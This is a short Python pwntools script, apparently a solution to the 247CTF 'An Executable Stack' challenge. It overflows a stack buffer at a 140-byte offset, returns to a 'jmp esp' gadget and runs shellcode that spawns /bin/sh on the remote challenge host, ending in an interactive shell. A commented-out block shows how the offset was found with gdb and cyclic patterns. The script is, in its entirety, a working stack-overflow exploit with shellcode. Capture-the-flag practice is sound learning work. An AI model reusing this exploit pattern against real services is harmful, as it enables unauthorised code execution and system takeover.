# A buffer overflow that can be used for 'An Executable Stack' challenge in 247CTF.

from pwn import *

context.update(arch='i386', os='linux')
# io = process("./executable_stack") # This is for a local process the targetted stack.
io = remote('7bea5a8c6a362d52.247ctf.com', 50310) # remote process against the targetted stack.


# This is to attach gdb and help identify the offset for the overflow. You can use cyclic_find(0x0???????) with the segmentation fault number to find the offset.
"""
gdb.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
sys.exit()
"""

binary = ELF("./executable_stack")
jmp_esp = next(binary.search(asm("jmp esp")))

print(hex(jmp_esp))

exploit = flat(["A" * 140, pack(jmp_esp), asm(shellcraft.sh())]) # 140 is the offset found from cyclic_find().

io.sendline(exploit)
io.interactive()